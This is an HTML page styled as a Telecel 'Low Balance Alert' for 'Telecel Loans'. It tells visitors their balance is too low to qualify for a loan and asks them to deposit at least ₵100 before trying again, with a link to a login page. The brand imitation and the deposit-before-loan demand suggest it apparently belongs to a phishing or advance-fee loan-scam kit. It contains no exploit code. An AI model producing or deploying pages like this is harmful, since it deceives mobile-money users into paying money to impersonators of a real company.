<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Telecel – Low Balance Alert</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    :root {
      --bg: #f5f5f5;
      --card: #ffffff;
      --border: #e5e7eb;
      --text: #111827;
      --sub: #6b7280;
      --telecel-red: #ff0000;
      --telecel-darkred: #cc0000;
      --shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
      --radius: 18px;
    }

    body {
      font-family: 'Inter', Arial, Helvetica, sans-serif;
      background: var(--bg);
      color: var(--text);
      padding: 20px 12px;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .container {
      width: 100%;
      max-width: 420px;
      background: #f7f7f7;
      border-radius: 28px;
      padding: 24px 20px 30px;
      box-shadow: var(--shadow);
      position: relative;
      overflow: hidden;
    }

    .top-bg {
      position: absolute;
      top: 0;
      right: 0;
      width: 220px;
      height: 220px;
      background: linear-gradient(135deg, rgba(255, 0, 0, 0.25), rgba(255, 0, 0, 0.6));
      border-bottom-left-radius: 120px;
      z-index: 0;
      pointer-events: none;
    }

    .telecel-header {
      position: relative;
      z-index: 2;
      text-align: center;
      margin-bottom: 16px;
    }

    .logo-circle {
      width: 56px;
      height: 56px;
      background: var(--telecel-red);
      border-radius: 50%;
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 32px;
      font-weight: 800;
      margin: 0 auto 6px;
      box-shadow: 0 4px 10px rgba(255, 0, 0, 0.3);
    }

    .logo-text {
      color: var(--telecel-red);
      font-size: 28px;
      font-weight: 800;
      letter-spacing: -0.5px;
      line-height: 1;
      margin-bottom: 4px;
    }

    /* Alert card */
    .alert-card {
      background: var(--card);
      border-radius: var(--radius);
      padding: 28px 20px;
      box-shadow: var(--shadow);
      border: 1px solid var(--border);
      text-align: center;
      margin: 20px 0 24px;
      position: relative;
      z-index: 2;
    }

    /* Title styling – prominent with icon */
    .alert-title {
      font-size: 28px;
      font-weight: 800;
      color: var(--telecel-red);
      margin-bottom: 20px;
      letter-spacing: -0.3px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }

    .alert-title i {
      font-size: 32px;
      color: #ffaa00; /* warning icon color */
    }

    /* Unified amount styling – both "Minimum" and "₵100" same look */
    .amount {
      font-size: 42px;
      font-weight: 800;
      color: var(--telecel-red);
      margin-bottom: 12px;
      line-height: 1.2;
    }

    .message-text {
      font-size: 16px;
      color: var(--sub);
      line-height: 1.6;
      margin-bottom: 28px;
      max-width: 300px;
      margin-left: auto;
      margin-right: auto;
    }

    .message-text strong {
      color: var(--text);
      font-weight: 700;
    }

    .btn {
      width: 100%;
      padding: 16px 20px;
      border: none;
      border-radius: 40px;
      background: var(--telecel-red);
      color: white;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      box-shadow: 0 8px 20px rgba(255, 0, 0, 0.3);
      transition: 0.2s;
      text-decoration: none;
      display: inline-block;
    }

    .btn:hover {
      background: #e60000;
      transform: scale(1.02);
    }

    .footer {
      text-align: center;
      margin-top: 24px;
      font-size: 12px;
      color: #aaa;
      position: relative;
      z-index: 2;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="top-bg"></div>

    <div class="telecel-header">
      <div class="logo-circle">t</div>
      <div class="logo-text">telecel</div>
    </div>

    <div class="alert-card">
      <!-- Prominent title with icon -->
      <div class="alert-title">
        <i class="fas fa-exclamation-triangle"></i> Low Balance Alert
      </div>

      <!-- Unified "Minimum ₵100" – same style for both words and amount -->
      <div class="amount">Minimum ₵100</div>

      <div class="message-text">
        Your account balance is too low to qualify for a loan limit.<br><br>
        Please deposit at least <strong>₵100</strong> via the Telecel app, then try again.
      </div>

      <a href="login.html" class="btn">Try Again After Deposit</a>
    </div>

    <div class="footer">
      v26.2.2 (TPA-2622) • Telecel Loans
    </div>
  </div>
</body>
</html>
